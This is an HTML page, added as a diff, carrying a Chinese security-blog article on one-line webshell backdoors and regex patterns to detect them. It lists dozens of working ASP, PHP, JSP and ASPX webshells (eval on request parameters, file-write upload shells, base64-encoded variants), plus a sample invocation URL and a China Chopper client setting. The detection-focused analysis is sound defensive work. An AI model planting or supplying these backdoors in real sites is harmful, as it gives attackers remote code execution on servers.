@@ -1,0 +1,222 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>一句话木马后门及其正则检测 - Hackersoul.com</title>
+  <meta name="keywords" content="HackerSoul,FF0000TEAM,一句话木马检测,后门检测方法">
+  <meta name="description" content="一句话后门木马正则检测方法 - FF0000 TeAm">
+  <link rel="stylesheet" type="text/css" href="/css/bootstrap.min.css">
+  <link rel="stylesheet" type="text/css" href="/css/hackersoul.css">
+  <link rel="shortcut icon" href="favicon.ico" type=image/x-icon>
+</head>
+
+<body>
+  <div class="header">
+    <img src="/img/hs_header.jpg" class="header-bg">
+  </div>
+  <div class="narrow-board">
+    <a class="logo-container" href="/" title="一个有情怀的黑客博客">
+      <img src="/img/hs_logo.png" class="logo">
+      <div class="slogan">Enjoy hacking, Enjoy life.</div>
+    </a>
+
+    <div class="post">
+      <pre>
+      <xmp>                           
+                           .::一句话木马及其正则检测::.
+
+                    We enjoy hacking of life in day and night.
+
+                _______________________________________________
+				
+                  [+] Author: Everfly
+                  [+] Team: FF0000 TEAM <http://www.ff0000.cc>
+                  [+] From: HackerSoul <http://www.hackersoul.com>
+                  [+] Create: 2013-09-05
+                _______________________________________________
+
+
+                                  -= Main =-
+
+一句话木马后门短小精悍，功能强大及其隐蔽性也非常好。而它其语句的多变性，以及通过加解密、转码等方式来自我隐藏的手法，让后门检测工作颇为棘手。
+本文分类总结各种一句话及其变种，并给出了通用的检测正则，也讨论了针对某些变种当前检测方式的局限性。
+
+
+[+]ASP一句话
+
+1) <%eval request("sb")%>
+2) <%execute request("sb")%>
+3) <%execute(request("sb"))%>
+4) <%execute request("sb")%><%'<% loop <%:%>
+5) <%'<% loop <%:%><%execute request("sb")%>
+6) <%execute request("sb")'<% loop <%:%>
+7) <script language=vbs runat=server>eval(request("sb"))
+8) %><%Eval(Request(chr(35)))%><%
+9) <%eval request("sb")%>
+10） <%eval_r(Request("0x001"))%>
+11） <%ExecuteGlobal request("sb")%>
+12） if Request("sb")<>"" then ExecuteGlobal request("sb") end if
+13） <%@LANGUAGE="JAVASCRIPT" CODEPAGE="65001"%>
+     <%var lcx = {'名字' : Request.form('#'), '性别' : eval, '年龄' : '18', '昵称' : 'o040'};lcx.性别((lcx.名字)+'');%>
+14） <%
+     Set o = Server.CreateObject("ScriptControl")
+     o.language = "vbscript"
+     o.addcode(Request("SubCode")) '参数SubCode作为过程代码
+     o.run "e",Server,Response,Request,Application,Session,Error '参数名e 调用之，同时压入6个基对象作为参数
+     %>
+
+[+]调用示例：
+·程序代码
+http://localhost/tmp.asp?SubCode=sub%20e%28Server,Response,Request,Application,Session,Error%29%20eval%28request%28%22v%22%29%29%20end
+%20sub&v=response.write%28server.mappath%28%22tmp.asp%22%29%29
+
+[+]检测正则
+
+·A: ((?:eval|eval_r|execute|ExecuteGlobal)\s*?\(?request)
+正则解释图：http://worm.cc/everfly/001/001.png
+正则适用于：(1)-(12)，其中匹配出(8)需以大小写不敏感的方式进行匹配（如python中使用re.I作为匹配函数的flag）
+
+        |=------------------------------------------------------------=|
+
+[+]php一句话
+
+1) <?php eval($_POST[sb]);?>
+2) <?php @eval($_POST[sb]);?>
+3) <?php assert($_POST[sb]);?>
+4) <?$_POST['sa']($_POST['sb']);?>
+5) <?$_POST['sa']($_POST['sb'],$_POST['sc'])?>
+6) <?php @preg_replace("/[email]/e",$_POST['h'],"error"); ?>
+　 //使用这个后,使用菜刀一句话客户端在配置连接的时候在"配置"一栏输入
+　 <O>h=@eval($_POST[c]);</O>
+7) <script language="php">@eval($_POST[sb])</script>
+8) $filename=$_GET['xbid'];
+   include ($filename);
+
+[+]检测正则
+
+·A：((?:exec|base64_decode|edoced_46esab|eval|eval_r|system|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source|assert)\s*?\(\$(?:_POST|_GET|_REQUEST|GLOBALS))
+正则解释图：http://worm.cc/everfly/001/003.png
+正则适用于：(1)(2)(3)(6)(7)
+
+·B: ((?:_POST|_GET|_REQUEST|GLOBALS)\[(?:.*?)\]\(\$(?:_POST|_GET|_REQUEST|GLOBALS))
+正则解释图：http://worm.cc/everfly/001/005.png
+正则适用于：(4)(5)
+
+        |=------------------------------------------------------------=|
+
+[+]浅谈加密变种检测
+
+·这里主要讨论base64算法加密的变种，能不能通过匹配加密以后的密文串来进行检测。
+·Base64算法的细节不再深究，但需了解其最基本的一个属性：
+加密时，将明文字符串分为每3个字符一组进行加密，每一组的3个明文字符在加密后变为4个密文字符，尾部不足3个时用”=”补尾。
+简而言之，加密时，把3个字符变成4个字符。反之，解密过程把4个字符变成3个字符。
+
+·Base64加密的一句话PHP后门： base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz4=)
+·其中 PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz4= 即为base64编码后的字符串，将其解密可以得到: <?php eval($_POST[xiao])?>
+
+[*]改变其中密码的部分——xiao，结果如下：
+
+PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz4=	<?php eval($_POST[xiao])?>
+PD9waHAgZXZhbCgkX1BPU1RbeHh4eF0pPz4=	<?php eval($_POST[xxxx])?>
+PD9waHAgZXZhbCgkX1BPU1RbeHh4XSk/Pg==	<?php eval($_POST[xxx])?>
+PD9waHAgZXZhbCgkX1BPU1RbeXl5XSk/Pg==	<?php eval($_POST[yyy])?>
+PD9waHAgZXZhbCgkX1BPU1RbeHhdKT8+	<?php eval($_POST[xx])?>
+PD9waHAgZXZhbCgkX1BPU1RbeXldKT8+	<?php eval($_POST[yy])?>
+PD9waHAgZXZhbCgkX1BPU1RbeF0pPz4=	<?php eval($_POST[x])?>
+PD9waHAgZXZhbCgkX1BPU1RbeV0pPz4=	<?php eval($_POST[y])?>
+
+[*]从以上内容可以看出PD9waHAgZXZhbCgkX1BPU1Rbe 即为 <?php eval($_POST[ 对应的密文字符串。
+[*]那么，这是否意味着，可以把PD9waHAgZXZhbCgkX1BPU1Rbe 写进正则表达式，当作关键字来匹配呢？
+[+]请继续看下面的例子：
+
+eval($_POST	 ZXZhbCgkX1BPU1Q=
+eval	 ZXZhbA==
+_POST	 X1BPU1Q=
+
+似乎也是有规律可循的，即右侧密文串与上面的还是有很大相似度，似乎可以写进正则表达式。
+再看看这个特殊的例子：
+<?php   eval($_POST[xiao])?>	PD9waHAgICBldmFsKCRfUE9TVFt4aWFvXSk/Pg==
+
+其中 php 和 eval 之间有3个空格，结果却大不一样。仔细观察以下代码：
+<?php eval($_POST[xiao])?>
+<?php   eval($_POST[xiao])?>
+
+对比以上两行代码，再联系到base64在加密时“把3个字符变成4个字符”，结果大相径庭以及为什么有少部分相同的原因也就不言而喻了：
+
+<?php eval($_POST[xiao])?>中：
+　　	<?p  →  PD9w
+　　	hp_  →  aHAg
+eva  →  ZXZh
+
+<?php eval($_POST[xiao])?>中：
+　　	<?p  →  PD9w
+　　	hp_  →  aHAg
+　　  	__e  →  ICBl
+
+可以看到，在多加入了几个空格以后，密文串已经面目全非了。
+而php的代码中很多位置都可以插入任意数量的空格而不影响代码的执行效果，除此以外还可以在一句代码的末尾插入多个 ; 作为多个空语句。
+
+·因此，检测加密以后的字符串的检测方式不可行，只能通过检测关键函数base64_decode的调用来判断这类一句话。
+·但是，这样做会有较高的误报率，宁可误报也不漏报的方式更为合适。
+
+        |=------------------------------------------------------------=|
+
+[+]JSP一句话
+
+1) <% if(request.getParameter("f")!=null)(new java.io.FileOutputStream(application.getRealPath("\\")+request.getParameter("f"))).write(request.getParameter("t").getBytes()); %>
+　　提交客户端:
+　　<form action="http://59.x.x.x:8080/scdc/bob.jsp?f=fuckjp.jsp" method="post">
+　　<textarea name=t cols=120 rows=10 width=45>your code</textarea><BR><center><br>
+　　<input type=submit value="提交">
+　　</form>
+
+A:检测正则
+·write\(request\.getParameter
+这个正则很简单，仅仅做了明文匹配，就不再赘述了。
+
+        |=------------------------------------------------------------=|
+
+[+]ASPX一句话
+
+1) <%@ Page Language="Jscript"%><%eval(Request.Item["pass"],"unsafe");%>
+2) <%@ Page Language="Jscript" validateRequest="false" %><%Response.Write(eval(Request.Item["w"],"unsafe"));%>
+　　//Jscript的asp.net一句话
+3) <%if (Request.Files.Count!=0) { Request.Files[0].SaveAs(Server.MapPath(Request["f"])  ); }%>
+　　//C#的asp.net一句话
+4) <% If Request.Files.Count <> 0 Then Request.Files(0).SaveAs(Server.MapPath(Request("f")) ) %>
+
+[+]检测正则
+
+·A: ((?:eval|eval_r|execute|ExecuteGlobal).*?request)
+正则解释：见asp一句话中的2.A：
+正则适用于：(1) (2)
+
+
+·B: SaveAs\(\s*?Server\.MapPath\(\s*?Request
+正则解释图：http://worm.cc/everfly/001/008.png
+正则适用于：(3) (4)
+
+        |=------------------------------------------------------------=|
+
+[+]Other
+
+·一句话木马还有许多其他形式的变种，如改变关键字的字符集等，这些检测起来也比较棘手，原因及折衷的解决方案与文中讨论过的检测base64加密一句话的情况类似，这里不再赘述。
+
+·本文参考资料：
+http://www.vfocus.net/art/20100728/7504.html
+http://www.cnblogs.com/0x001/archive/2011/06/10/2077408.html
+
+·本文正则工具：RegexBuddy
+
+·Thanks: 宝宝、Evi1m0
+                                  -= END =-
+      </xmp>
+      </pre>
+    </div>
+
+    <div class="footer">
+	<span class="copy">&copy;&nbsp;</span>2014 FF0000 TeAm. <a href="/about.html" class="red-link">About Us</a>
+    </div>
+  </div>
+</body>
+</html>
